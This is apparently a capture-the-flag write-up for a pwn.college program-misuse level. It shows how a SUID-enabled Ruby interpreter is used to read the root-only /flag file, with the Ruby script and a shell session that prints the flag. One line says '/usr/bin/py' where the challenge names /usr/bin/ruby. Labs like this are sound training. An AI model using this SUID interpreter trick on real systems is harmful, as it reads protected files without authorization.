
https://ruby-lang.org/en/documentation/quickstart/

`ruby` is a dynamic, high-level programming language known for its simplicity, productivity and readability. It was created by `Yukihiro Matsumoto(Matz)` in the mid `1990s`.

`SUID` bit has been set for the `/usr/bin/py`. Let's write a `ruby` program that's read a file.

```ruby
 file_path = '/flag'

 begin
	 File.open(file_path, 'r') do |file|
		 file.each_line do |line|
			puts line
		 end
	 end
  end
```

```shell
hacker@program-misuse-level-43:~$ /challenge/babysuid_level43 
Welcome to /challenge/babysuid_level43!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/ruby.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level43) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ruby!
hacker@program-misuse-level-43:~$ touch test.rb
hacker@program-misuse-level-43:~$ ls -l
total 16
drwxr-xr-x 2 hacker hacker 4096 Dec 30 07:37 Desktop
drwxr-xr-x 2 hacker hacker 4096 Jan  2 18:00 demo
-rw-r--r-- 1 hacker hacker  104 Jan  3 13:49 test.pl
-rw-r--r-- 1 hacker hacker   67 Jan  3 14:05 test.py
-rw-r--r-- 1 hacker hacker    0 Jan  3 14:12 test.rb
hacker@program-misuse-level-43:~$ nano test.rb
hacker@program-misuse-level-43:~$ ruby test.rb
pwn.college{o4UM4OIInCgO2GPdEyujOIY-3L5.0VN4EDL0AjNzQzW}
```

